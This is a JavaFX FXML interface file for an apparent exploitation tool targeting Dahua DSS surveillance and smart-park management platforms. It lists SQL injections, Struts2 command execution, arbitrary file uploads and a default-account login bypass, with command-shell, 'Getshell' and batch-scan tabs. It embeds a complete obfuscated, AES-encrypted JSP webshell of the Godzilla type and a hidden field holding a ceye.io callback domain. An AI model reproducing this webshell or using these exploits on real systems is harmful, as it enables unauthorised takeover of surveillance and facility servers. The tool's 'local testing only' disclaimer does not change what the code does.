<?xml version="1.0" encoding="UTF-8"?>

<?import java.lang.String?>
<?import javafx.collections.FXCollections?>
<?import javafx.scene.control.Button?>
<?import javafx.scene.control.ComboBox?>
<?import javafx.scene.control.Label?>
<?import javafx.scene.control.Menu?>
<?import javafx.scene.control.MenuBar?>
<?import javafx.scene.control.MenuItem?>
<?import javafx.scene.control.Tab?>
<?import javafx.scene.control.TabPane?>
<?import javafx.scene.control.TextArea?>
<?import javafx.scene.control.TextField?>
<?import javafx.scene.layout.AnchorPane?>
<?import javafx.scene.text.Font?>

<AnchorPane prefHeight="935.0" prefWidth="1268.0" xmlns="http://javafx.com/javafx/8.0.171" xmlns:fx="http://javafx.com/fxml/1" fx:controller="fc">
   <children>
      <ComboBox fx:id="comboBox" layoutX="464.0" layoutY="63.0" prefHeight="32.0" prefWidth="334.0" promptText="ALL" visibleRowCount="20">
         <items>
            <FXCollections fx:factory="observableArrayList">
                <String fx:value="ALL" />
               <String fx:value="大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" />
               <String fx:value="大华DSS数字监控系统远程命令执行漏洞" />
               <String fx:value="大华DSS数字监控系统itcBulletin注入漏洞" />
                <String fx:value="大华智慧园区综合管理平台信息泄露漏洞" />
                <String fx:value="大华智慧园区综合管理平台getNewStaypointDetailQuery注入漏洞" />
                <String fx:value="大华智慧园区综合管理平台clientserver注入" />
                <String fx:value="大华DSS user_edit.action信息泄露漏洞" />
                <String fx:value="大华智慧园区综合管理平台poi任意文件上传漏洞" />
                <String fx:value="大华智慧园区综合管理平台video任意文件上传漏洞" />
                <String fx:value="大华智慧园区综合管理平台emap任意文件上传漏洞" />
                <String fx:value="大华智慧园区综合管理平台searchJson注入漏洞" />
                <String fx:value="大华DSS数字监控系统attachment_getAttList.action注入漏洞" />
                <String fx:value="大华智能物联综合管理平台justForTest用户登录漏洞" />



            </FXCollections>
         </items>
      </ComboBox>

       <Label layoutX="10.0" layoutY="69.0" text="目标：" />
      <TextField fx:id="test2" layoutX="55.0" layoutY="63.0" prefHeight="32.0" prefWidth="312.0" />
      <Label layoutX="380.0" layoutY="72.0" text="选择模块：" />

      <TabPane layoutX="12.0" layoutY="126.0" prefHeight="715.0" prefWidth="1309.0" tabClosingPolicy="UNAVAILABLE">
        <tabs>
          <Tab text="检测日志">
            <content>
              <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="751.0" prefWidth="1283.0">
                     <children>
                        <TextArea fx:id="test1" editable="false" layoutX="-2.0" layoutY="-4.0" prefHeight="684.0" prefWidth="1317.0" text="&#10;该程序仅用于安全人员本地测试&#10;用户滥用造成的一切后果和作者无关&#10;请遵守法律法规！" wrapText="true">
                           <font>
                              <Font size="16.0" />
                           </font></TextArea>
                     </children></AnchorPane>
            </content>
          </Tab>
          <Tab text="Cmdshell">
            <content>
              <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="585.0" prefWidth="1118.0">
                     <children>
                        <TextArea fx:id="cmd" layoutX="3.0" layoutY="82.0" prefHeight="575.0" prefWidth="1299.0" wrapText="true">
                           <font>
                              <Font size="16.0" />
                           </font></TextArea>
                        <Label layoutX="23.0" layoutY="33.0" text="内置模块:" />

                        <TextField fx:id="test3" layoutX="408.0" layoutY="29.0" prefHeight="30.0" prefWidth="387.0" />
                        <Label layoutX="330.0" layoutY="33.0" text="Cmdshell:" />
                        <Button layoutX="979.0" layoutY="28.0" mnemonicParsing="false" onAction="#rce6" prefHeight="30.0" prefWidth="145.0" text="执行" />
                        <Button layoutX="808.0" layoutY="28.0" mnemonicParsing="false" onAction="#re1" prefHeight="30.0" prefWidth="147.0" text="验证" />
                  
                         <ComboBox fx:id="comboBox3" layoutX="96.0" layoutY="28.0" prefHeight="30.0" prefWidth="219.0" promptText="All">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="大华DSS数字监控系统远程命令执行漏洞" />
                                     
                                    
                                    
                                 </FXCollections>
                             </items>
                         </ComboBox>
                     </children></AnchorPane>
            </content>
          </Tab>
            <Tab text="webshell利用">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <Label layoutX="50.0" layoutY="44.0" />
                        <TextArea layoutX="3.0" layoutY="75.0" prefHeight="365.0" prefWidth="1297.0" text="&lt;%! String xc = &quot;5f4dcc3b5aa765d6&quot;;class X extends ClassLoader {public X(ClassLoader z) {super(z); }public Class Q(byte[] cb) {return super.defineClass(cb, 0, cb.length);}}public byte[] x(byte[] s, boolean m) {try {javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&quot;AES&quot;);Class&lt;?&gt; aClass = Class.forName(&quot;javax.crypto.spec.SecretKeySpec&quot;);java.lang.reflect.Constructor&lt;?&gt;constructor = aClass.getConstructor(byte[].class, String.class);javax.crypto.spec.SecretKeySpec skeySpec = (javax.crypto.spec.SecretKeySpec) constructor.newInstance(xc.getBytes(), &quot;AES&quot;);c.init(m ? 1 : 2, skeySpec);byte[] result = (byte[]) c.getClass()./*Z5T0ynvHb5*/getDeclaredMethod/*Z5T0ynvHb5*/(&quot;doFinal&quot;, new Class[]{byte[].class}).invoke(c, new Object[]{s});return result; } catch (Exception e) {return null;}} %&gt;&lt;%  try {byte[] C707 = new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))]; java.io.InputStream inputStream = request.getInputStream(); int _num = 0; while ((_num += inputStream.read(C707, _num, C707.length)) &lt; C707.length) ; C707 = x(C707, false); if (session.getAttribute(&quot;payload&quot;) == null) {session.setAttribute(&quot;payload&quot;, new X(Thread.currentThread()./*Z5T0ynvHb5*/getContextClassLoader()).Q(C707)); } else {request.setAttribute(&quot;parameters&quot;, C707);Object f = ((Class) session.getAttribute(&quot;payload&quot;)).newInstance();java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();f.equals(/*Z5T0ynvHb5*/arrOut);f.equals(/*Z5T0ynvHb5*/pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true)); }} catch (Exception e) {} %&gt;" wrapText="true">
                           <font>
                              <Font size="16.0" />
                           </font></TextArea>
                        <Button layoutX="856.0" layoutY="29.0" mnemonicParsing="false" onAction="#re2" prefHeight="30.0" prefWidth="127.0" text="poi Getshell" />
                        <Label layoutX="21.0" layoutY="34.0" text="选择模块：" />
                        <TextArea fx:id="cmd1" layoutX="5.0" layoutY="511.0" prefHeight="144.0" prefWidth="1290.0" />
                  
                         <ComboBox fx:id="comber" layoutX="96.0" layoutY="29.0" prefHeight="30.0" prefWidth="215.0" promptText="All">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="大华智慧园区综合管理平台poi任意文件上传漏洞" />
                                     <String fx:value="大华智慧园区综合管理平台video任意文件上传漏洞" />
                                     <String fx:value="大华智慧园区综合管理平台emap任意文件上传漏洞" />



                  
                                 </FXCollections>
                             </items>
                         </ComboBox>
                        <Label layoutX="329.0" layoutY="34.0" text="内置webshell：" />
                  
                         <ComboBox fx:id="comboBox2" layoutX="437.0" layoutY="29.0" prefHeight="30.0" prefWidth="233.0" promptText="All">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="Godzilla" />
                                     <String fx:value="Behinder" />
                                     <String fx:value="jspcmdshell" />
                                     <String fx:value="测试文件" />
                                 </FXCollections>
                             </items>
                         </ComboBox>






                        <Button layoutX="697.0" layoutY="29.0" mnemonicParsing="false" onAction="#re" prefHeight="30.0" prefWidth="144.0" text="验证" />
                        <Button layoutX="5.0" layoutY="449.0" mnemonicParsing="false" onAction="#rce16" prefHeight="30.0" prefWidth="133.0" text="自定义上传" />
                        <Label layoutX="26.0" layoutY="485.0" text="传输日志:" />
                        <Button layoutX="997.0" layoutY="29.0" mnemonicParsing="false" onAction="#re3" prefHeight="30.0" prefWidth="127.0" text="video Getshell" />
                        <Button layoutX="1138.0" layoutY="29.0" mnemonicParsing="false" onAction="#re4" prefHeight="30.0" prefWidth="127.0" text="emap Getshell" />
                     </children></AnchorPane>
               </content>
            </Tab>


            <Tab text="批量检测">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <TextArea layoutX="-10.0" layoutY="-2.0" prefHeight="681.0" prefWidth="1309.0" wrapText="true">
                           <font>
                              <Font size="16.0" />
                           </font>
                        </TextArea>
                        <Label layoutX="367.0" layoutY="38.0" text="选择模块:" />
                        <Label layoutX="14.0" layoutY="38.0" text="内置路径:" />
                        <Button layoutX="980.0" layoutY="33.0" mnemonicParsing="false" onAction="#pl" prefHeight="30.0" prefWidth="137.0" text="选择模块" />
                        <Button layoutX="812.0" layoutY="33.0" mnemonicParsing="false" onAction="#pl1" prefHeight="30.0" prefWidth="144.0" text="默认模块" />
                        <TextArea fx:id="url10" layoutX="7.0" layoutY="95.0" prefHeight="573.0" prefWidth="1291.0" />
                        <TextField disable="true" layoutX="91.0" layoutY="33.0" prefHeight="30.0" prefWidth="261.0" text="url.txt" />
                  
                         <ComboBox fx:id="comboBox4" layoutX="452.0" layoutY="33.0" prefHeight="30.0" prefWidth="334.0" promptText="All">
                             <items>
                                 <FXCollections fx:factory="observableArrayList">
                                     <String fx:value="大华DSS数字监控系统远程命令执行漏洞" />
                                     <String fx:value="大华智慧园区综合管理平台信息泄露漏洞" />
                                     <String fx:value="大华智能物联综合管理平台justForTest用户登录漏洞" />
                                     <String fx:value="大华DSS数字监控系统attachment_clearTempFile.action注入漏洞" />
                                     <String fx:value="大华DSS数字监控系统itcBulletin注入漏洞" />
                                     <String fx:value="大华智慧园区综合管理平台clientserver注入" />
                                     <String fx:value="大华智慧园区综合管理平台searchJson注入漏洞" />
                                     <String fx:value="大华智慧园区综合管理平台poi任意文件上传漏洞" />
                                     <String fx:value="大华智慧园区综合管理平台video任意文件上传漏洞" />
                                 </FXCollections>
                             </items>
                         </ComboBox>
                     </children>
                  </AnchorPane>
               </content>
            </Tab>
            <Tab text="漏洞说明">
               <content>
                  <AnchorPane minHeight="0.0" minWidth="0.0" prefHeight="180.0" prefWidth="200.0">
                     <children>
                        <TextArea layoutX="-4.0" layoutY="-3.0" prefHeight="681.0" prefWidth="1309.0" text="大华DSS存在SQL注入漏洞，攻击者 attachment_clearTempFile.action路由发送特殊构造的数据包，利用报错注入获取数据库敏感信息。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限&#10;大华DSS数字监控系统存在Struct2-045命令执行漏洞，攻击者可以利用此漏洞获取服务器权限&#10;大华DSS存在SQL注入漏洞，攻击者 /portal/services/itcBulletin 路由发送特殊构造的数据包，利用报错注入获取数据库敏感信息。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限&#10;大华智慧园区综合管理平台存在信息泄露漏洞,攻击者通过此漏洞获取用户名及密码进行后台登陆&#10;大华智慧园区综合管理平台getNewStaypointDetailQuery接口处未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限&#10;大华智慧园区综合管理平台clientServer接口处未对用户的输入进行有效的过滤，直接将其拼接进了SQL查询语句中，导致系统出现SQL注入漏洞。远程未授权攻击者可利用此漏洞获取敏感信息，进一步利用可能获取目标系统权限&#10;大华DSS存在信息泄露漏洞,攻击者可以通过该漏洞获取服务器敏感信息,造成大量敏感信息泄露&#10;大华智慧园区综合管理平台 /emap/webservice/gis/soap/poi接口处存在任意文件上传漏洞，未授权的攻击者可以上传后门文件，从而控制服务器权限&#10;大华智慧园区综合管理平台video接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，控制服务器权限&#10;大华园区综合管理平台/emap/webservice/gis/soap/bitmap接口处存在任意文件上传漏洞，恶意攻击者可能会上传后门文件，造成服务器失陷&#10;大华智能物联综合管理平台用户登录接口/evo-apigw/evo-oauth/oauth/token存在漏洞，使用用户justForTest/任意密码即可成功登录平台，造成信息泄露" wrapText="true">
                           <font>
                              <Font size="16.0" />
                           </font>
                        </TextArea>
                     </children>
                  </AnchorPane>
               </content>
            </Tab>
        </tabs>
      </TabPane>
      <Button layoutX="819.0" layoutY="63.0" mnemonicParsing="false" onAction="#rce1" prefHeight="32.0" prefWidth="144.0" text="检测" />
      <Button layoutX="1141.0" layoutY="64.0" mnemonicParsing="false" onAction="#rce3" prefHeight="32.0" prefWidth="127.0" text="清空面板" />
      <Button layoutX="990.0" layoutY="64.0" mnemonicParsing="false" onAction="#rce5" prefHeight="32.0" prefWidth="127.0" text="选择模块" />
      <MenuBar prefHeight="32.0" prefWidth="1283.0">
        <menus>
          <Menu mnemonicParsing="false" text="设置">
            <items>
              <MenuItem mnemonicParsing="false" onAction="#rce4" text="版本" />
            </items>
          </Menu>
        </menus>
      </MenuBar>
      <TextField fx:id="ml" layoutX="1319.0" layoutY="87.0" prefHeight="30.0" prefWidth="8.0" text="2skv3a.ceye.io" />
   </children>
</AnchorPane>
